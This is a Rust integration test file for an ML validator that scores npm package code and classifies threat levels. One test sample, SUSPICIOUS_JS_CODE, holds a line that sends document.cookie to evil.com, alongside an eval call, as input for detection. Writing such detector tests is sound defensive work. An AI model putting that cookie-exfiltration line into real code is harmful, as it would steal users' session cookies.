//! Integration tests for ML-based validation

use ml_validator::{FeatureExtractor, MlValidator, ThreatLevel};

const SAFE_JS_CODE: &str = r#"
function greet(name) {
    console.log("Hello, " + name);
}
module.exports = { greet };
"#;

const SUSPICIOUS_JS_CODE: &str = r#"
const code = "console.log('test')";
eval(code);
fetch("http://evil.com/" + document.cookie);
"#;

#[test]
fn test_ml_safe_package() {
    let features = FeatureExtractor::extract("npm", SAFE_JS_CODE)
        .expect("Failed to extract features");
    
    let validator = MlValidator::new();
    let result = validator.predict(&features);
    
    // Safe code should have low threat score
    assert!(result.threat_score < 50, "Safe code should have low score, got {}", result.threat_score);
    assert!(!result.should_reject());
}

#[test]
fn test_ml_suspicious_package() {
    let features = FeatureExtractor::extract("npm", SUSPICIOUS_JS_CODE)
        .expect("Failed to extract features");
    
    let validator = MlValidator::new();
    let result = validator.predict(&features);
    
    // Suspicious code should have higher threat score
    assert!(result.threat_score > 30, "Suspicious code should have higher score, got {}", result.threat_score);
}

#[test]
fn test_threat_level_classification() {
    assert_eq!(ThreatLevel::from_score(10), ThreatLevel::Safe);
    assert_eq!(ThreatLevel::from_score(35), ThreatLevel::Low);
    assert_eq!(ThreatLevel::from_score(60), ThreatLevel::Suspicious);
    assert_eq!(ThreatLevel::from_score(85), ThreatLevel::Malicious);
}

#[test]
fn test_threat_level_blocking() {
    assert!(!ThreatLevel::Safe.should_block());
    assert!(!ThreatLevel::Low.should_block());
    assert!(!ThreatLevel::Suspicious.should_block());
    assert!(ThreatLevel::Malicious.should_block());
}

#[test]
fn test_feature_extraction_js() {
    let features = FeatureExtractor::extract("npm", SAFE_JS_CODE)
        .expect("Failed to extract features");
    
    assert!(features.total_lines > 0);
    assert!(features.function_count >= 1);
    assert!(features.entropy > 0.0);
}

#[test]
fn test_batch_ml_verification() {
    let packages = vec![
        ("safe".to_string(), SAFE_JS_CODE),
        ("suspicious".to_string(), SUSPICIOUS_JS_CODE),
    ];
    
    let validator = MlValidator::new();
    let mut results = Vec::new();
    
    for (name, code) in packages {
        let features = FeatureExtractor::extract("npm", code).expect("Failed to extract");
        let result = validator.predict(&features);
        results.push((name, result));
    }
    
    assert_eq!(results.len(), 2);
    
    // Safe should have lower score than suspicious
    let safe_score = results.iter().find(|(n, _)| n == "safe").unwrap().1.threat_score;
    let suspicious_score = results.iter().find(|(n, _)| n == "suspicious").unwrap().1.threat_score;
    
    assert!(safe_score < suspicious_score, 
        "Safe score ({}) should be less than suspicious score ({})", 
        safe_score, suspicious_score);
}

#[test]
fn test_entropy_calculation() {
    let low_entropy = "hello world hello world";
    let high_entropy = "a8f4e2b9c1d7e3f5a2b8c4d6e1f9a3b7";
    
    let low = FeatureExtractor::shannon_entropy(low_entropy);
    let high = FeatureExtractor::shannon_entropy(high_entropy);
    
    assert!(high > low, "Random string should have higher entropy: {} vs {}", high, low);
}
